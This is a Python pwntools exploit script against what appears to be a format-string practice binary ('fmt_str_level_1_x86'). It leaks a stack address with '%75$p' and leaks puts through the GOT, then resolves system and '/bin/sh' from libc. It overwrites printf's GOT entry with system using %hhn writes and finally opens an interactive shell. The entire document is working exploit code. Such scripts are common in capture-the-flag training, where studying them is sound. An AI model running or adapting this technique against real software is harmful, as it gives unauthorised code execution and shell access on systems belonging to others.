#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'i386'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_level_1_x86'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =elf.libc

def fmt(prev, word, index):
    fmtstr = ""
    if prev < word:
        result = word - prev
        fmtstr += "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr.encode('utf-8')


def fmt_str(offset, size, addr, target):
    # offset 偏移位置  size 32?64  addr写入地址   target 写入内容
    payload = b""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload


dem = 'input:\n'
io.recvuntil('input:\n')
payload_search_main = b'%75$p\x00'
io.send(payload_search_main)
main_30 = int(io.recv()[2:10],16)
main_addr = main_30 - 30
py = elf.symbols['main'] - elf.got['puts']
puts_got = main_addr - py
print("puts_got is",hex(puts_got))

payload4searchbase = flat([puts_got ,b'%7$s\x00'])
io.send(payload4searchbase)
io.recv(4)
puts_addr = u32(io.recv(4))
print("puts_addr is",hex(puts_addr))
sys_addr , sh_addr = duchao_pwn_script.libcsearch_sys_sh('puts' , puts_addr , path = libc.path)
print("sys_addr is",hex(sys_addr))
print("sh_addr is",hex(sh_addr))

sys_addr_bytes = str(sys_addr).encode('utf-8')
py = elf.symbols['main'] - elf.got['printf']
printf_got = main_addr - py


payload4writeprintfgot = fmtstr_payload(7 , {printf_got : sys_addr})
#payload4writeprintfgot = fmt_str(7 , 4 , printf_got , sys_addr)
duchao_pwn_script.dbg(io)
#payload4writeprintfgot = p32(printf_got) + b"%" + sys_addr_bytes + b"c%7$hhn\x00"
io.sendafter(dem , payload4writeprintfgot)

io.sendafter(dem , b'/bin/sh\x00')
io.interactive()

